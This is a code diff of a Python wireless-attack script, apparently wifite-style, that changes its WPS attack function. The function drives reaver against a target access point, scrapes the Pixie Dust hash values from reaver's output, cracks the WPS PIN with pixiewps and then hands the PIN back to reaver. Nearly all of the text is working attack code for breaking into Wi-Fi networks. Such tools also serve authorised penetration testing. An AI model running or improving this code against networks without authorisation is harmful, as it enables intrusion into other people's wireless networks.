@@ -2886,16 +2886,14 @@ def wps_attack(iface, target):
 
 	p_out = open(temp + "reaver_out.out", "w")
 	#Run reaver to collect hashes
+	#Report when each hash is found
 	pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L", "-a", "-P" ], stdout=p_out).pid
 	p = open(temp + "reaver_out.out")
-	#Report when each hash is found
-
+                                                
 	try:
-		pid = Popen(["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv", "-N", "-L", "-a", "-P" ], stdout=p_out).pid
-		p = open(temp + "reaver_out.out")
 		while pixie_exit == "false":
 
-			while pixie == "false":
+			while pixie == "false" or pixie_exit == "false":
 
 				time.sleep(1)
 				line = p.readline()
@@ -2918,6 +2916,7 @@ def wps_attack(iface, target):
 					os.kill(pid, signal.SIGQUIT)
 					print GR+' [+]'+G+' E-Hash2 found'
 					pixie = "true"
+					pixie_exit = "true"
 				if PIXIE_TIMEOUT > 0 and p_run < int(time.time()):
 					print R+'\n [!]'+O+' unable to complete in %d seconds' % (PIXIE_TIMEOUT)
 					print R+' [+]'+W+' skipping pixiewps on %s' % (O+target.ssid+W)
@@ -2926,18 +2925,20 @@ def wps_attack(iface, target):
 					break
 
 	except KeyboardInterrupt:
-		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
+		print R+'\n (^C)'+O+' Pixiewps attack interrupted'+W
 		if attack_interrupted_prompt():
 			send_interrupt(proc)
 			print ''
 			exit_gracefully(0)
 
 	if pixie == "true":
-		#p = open(temp + "reaver_out.out")
+		print GR+' [+]'+G+' Cracking using pixiewps...'
+
+		p = open(temp + "reaver_out.out")
 		line="s"
 		p.seek(0)
 		while line:
-    
+ 
 		    line = p.readline()
 		    if "PKE:" in line:PKE=line
 		    if "PKR:" in line:PKR=line
@@ -2974,7 +2975,6 @@ def wps_attack(iface, target):
 			line = f.readline()
 			if "WPS pin:" in line:
 				WPSpin=line
-				print WPSpin
 				pixie_exit="true"
 			if "WPS pin not found!" in line:
 				WPSpin="WPS pin not found!"
@@ -2998,7 +2998,7 @@ def wps_attack(iface, target):
 	else:
 		WPSpin=WPSpin[WPSpin.find("WPS pin")+9:WPSpin.find("\n")]	#pixiewps found a pin, let's see if it works! Have to remove the -a flag, or it hangs. 
 		print GR+'\n [+]'+G+' PIN found:     %s' % (C+WPSpin+W)
-		print GR+' [+]'+G+' Handing pin to reaver'
+		if PIXIE_ONLY == "false":print GR+' [+]'+G+' Handing pin to reaver'
 	cmd = ['reaver',
 		'-i', iface,
 	       	'-b', target.bssid,
